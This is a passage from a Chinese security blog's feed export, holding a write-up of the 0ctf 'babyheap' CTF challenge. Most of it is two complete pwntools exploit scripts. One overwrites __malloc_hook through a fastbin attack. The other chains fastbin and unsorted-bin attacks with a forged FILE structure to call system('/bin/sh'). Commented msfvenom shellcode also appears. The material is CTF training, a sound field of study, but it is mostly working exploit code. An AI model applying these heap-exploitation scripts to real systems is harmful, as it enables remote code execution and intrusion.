dis=chain-flags;</div><div class="line">  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FILE struct size: 0x%x\n"</span>,<span class="keyword">sizeof</span>(FILE));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;chain - fp: 0x%x %x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> mode=&amp;(fp-&gt;_mode);</div><div class="line">    dis=mode-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;mode - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_ptr=&amp;(fp-&gt;_IO_write_ptr);</div><div class="line">    dis=write_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_base=&amp;(fp-&gt;_IO_write_base);</div><div class="line">    dis=write_base-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_base - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> vtable_offset=&amp;(fp-&gt;_vtable_offset);</div><div class="line">    dis=vtable_offset-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;vtable_offset - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> read_ptr=&amp;(fp-&gt;_IO_read_ptr);</div><div class="line">    dis=read_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;read_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div></pre></td></tr></table></figure></p><h3 id="0ctf-baby-heap"><a href="#0ctf-baby-heap" class="headerlink" title="0ctf baby heap"></a>0ctf baby heap</h3><p>这题有两种利用方式，一种是全程使用fastbin attack ，还有一种是既利用fast bin 又利用 unsorted bin attack</p><p>exp1 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-22 10:39:31</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"x86_64"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./babyheap"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></div><div class="line">ru(<span class="string">"Command:"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"Size: "</span>)</div><div class="line">sl(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,size,data)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line">ru(<span class="string">"Size: "</span>)</div><div class="line">sl(str(size))</div><div class="line">ru(<span class="string">"Content: "</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line"></div><div class="line">add(<span class="number">0x20</span>) <span class="comment">#index0</span></div><div class="line">add(<span class="number">0x1e0</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index2</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index3</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free index1</span></div><div class="line"></div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x28</span>+<span class="string">"\x30"</span></div><div class="line"></div><div class="line">fill(<span class="number">0</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#index4</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free 1</span></div><div class="line">free(<span class="number">2</span>) <span class="comment">#free 2</span></div><div class="line"></div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line"></div><div class="line">dump(<span class="number">4</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">libc_bin_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line"><span class="comment"># bin_offset = 0x3a5678</span></div><div class="line">one_gadget_offset = <span class="number">0x4425a</span></div><div class="line">local_bin_offset = <span class="number">0x3C4C58</span></div><div class="line">libc_base = libc_bin_addr - local_bin_offset</div><div class="line">libc.address = libc_base</div><div class="line"></div><div class="line">one_gadget_addr = one_gadget_offset+libc_base</div><div class="line"></div><div class="line">malloc_offset = <span class="number">0x3C4BD0</span></div><div class="line">malloc_addr = malloc_offset + libc_base</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#change index 4 meta</span></div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>)</div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">free(<span class="number">4</span>)</div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>,libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"></div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></div><div class="line">payload = flat(<span class="string">"\x00"</span>*<span class="number">19</span>,one_gadget_addr)</div><div class="line">fill(<span class="number">4</span>,len(payload),payload)</div><div class="line">raw_input()</div><div class="line">add(<span class="number">0x90</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_bin_addr="</span>+hex(libc_bin_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"libc_base="</span>+hex(libc_base)</div><div class="line"><span class="keyword">print</span> <span class="string">"one_gadget_addr="</span>+hex(one_gadget_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"malloc_addr="</span>+hex(malloc_addr)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>exp2 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">context(log_level = <span class="string">"debug"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></div><div class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#5</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#6</span></div><div class="line">    free(<span class="number">1</span>)</div><div class="line">    free(<span class="number">2</span>)</div><div class="line"><span class="comment"># over lap</span></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p8(<span class="number">0xc0</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#1</span></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># leak heap</span></div><div class="line">    </div><div class="line">    free(<span class="number">5</span>)</div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x61</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    heap_addr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x120</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"heap_addr = "</span>+hex(heap_addr)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc</span></div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0xc1</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    <span class="comment">#raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x50)</span></div><div class="line">    </div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line">    main_area = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    libc_base = main_area - <span class="number">0x3a5678</span></div><div class="line">    </div><div class="line">    libc.address = libc_base</div><div class="line"></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x58</span>)<span class="comment">#7</span></div><div class="line">    alloc(<span class="number">0x30</span>)<span class="comment">#8</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#9</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#10</span></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x61</span>+<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">5</span>,<span class="string">"\x00"</span>*(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>+<span class="number">0x60</span>+<span class="number">0x40</span>))</div><div class="line"></div><div class="line">    free(<span class="number">6</span>)</div><div class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#4</span></div><div class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</div><div class="line">    <span class="comment"># print "b*"+hex(0x7CE9A+libc_base)</span></div><div class="line">    <span class="comment"># print util.proc.pidof(r)</span></div><div class="line"></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># unsorted bin attack </span></div><div class="line">    payload  = <span class="string">"\x00"</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>)+p64(main_area)+p64(libc_base+<span class="number">0x3A6040</span><span class="number">-0x10</span>)</div><div class="line">    payload  = payload.ljust(<span class="number">0x100</span><span class="number">-0x50</span>,<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line">    data = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x101</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</div><div class="line">    data = data.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">    data = data.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(heap_addr+<span class="number">0x30</span>*<span class="number">4</span>+<span class="number">0x10</span>+len(payload+data)<span class="number">-0x18</span>+<span class="number">8</span>)</div><div class="line">    data += p64(libc.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line">    </div><div class="line">    fill(<span class="number">4</span>,payload+data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line"></div><div class="line">    </div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># fill(2,p64(main_area)+p64(libc_base+0x3C5600-0x10))</span></div><div class="line"></div><div class="line">    <span class="comment"># print "IO_LIST="+hex(libc_base+0x3C5600)</span></div><div class="line">    <span class="comment"># alloc(0x58)#4</span></div><div class="line">    <span class="comment"># alloc(0x20)#7</span></div><div class="line">    <span class="comment"># alloc(0x20)#8</span></div><div class="line">    <span class="comment"># free(4)</span></div><div class="line">    </div><div class="line">    <span class="comment"># fill(3,p64(0)*5+p64(0x71))</span></div><div class="line">    <span class="comment"># fill(2, p64(libc.symbols['__malloc_hook']-0x23))</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x58)#9</span></div><div class="line">    <span class="comment"># alloc(0x58)</span></div><div class="line">    <span class="comment"># alloc(0x30)#10</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># payload  = '\x00'*3</span></div><div class="line">    <span class="comment"># payload += p64(0)*2</span></div><div class="line">    <span class="comment"># payload += p64(libc_base + 0x41374)</span></div><div class="line">    <span class="comment"># fill(6, payload)</span></div><div class="line"></div><div class="line">    <span class="comment"># alloc(255)</span></div><div class="line"></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    log.info(<span class="string">"For remote: %s HOST PORT"</span> % sys.argv[<span class="number">0</span>])</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</div><div class="line">        r = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</div><div class="line">        exploit(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = process([<span class="string">'./fastbin'</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">        </div><div class="line">        exploit(r)</div></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/104144.html</a> （Linux堆内存管理深入分析（上））<br><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="external">http://www.freebuf.com/articles/security-management/105285.html</a> （Linux堆内存管理深入分析（下））</p><p><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a> （浅析Linux堆溢出之fastbin）</p><p><a href="http://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="external">http://www.cnblogs.com/shangye/p/6268981.html</a> （ house of orange ）</p><p><a href="http://www.bitscn.com/network/hack/200607/30235.html" target="_blank" rel="external">http://www.bitscn.com/network/hack/200607/30235.html</a> （ FSO 利用 ）</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;涉及到的知识点&quot;&gt;&lt;a href=&quot;#涉及到的知识点&quot; class=&quot;headerlink&quot; title=&quot;涉及到的知识点&quot;&gt;&lt;/a&gt;涉及到的知识点&lt;/h3&gt;&lt;p&gt;1、fastbin attack&lt;/p&gt;
&lt;p&gt;2、unsorted bin attack&lt;/p&gt;
&lt;p&gt;3、malloc堆内存管理&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap" scheme="https://winter3un.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>墨色的五月</title>
    <link href="https://winter3un.github.io/2017/06/03/%E5%A2%A8%E8%89%B2%E7%9A%84%E4%BA%94%E6%9C%88/"/>
    <id>https://winter3un.github.io/2017/06/03/墨色的五月/</id>
    <published>2017-06-03T15:20:53.000Z</published>
    <updated>2017-10-21T06:54:15.000Z</updated>
    
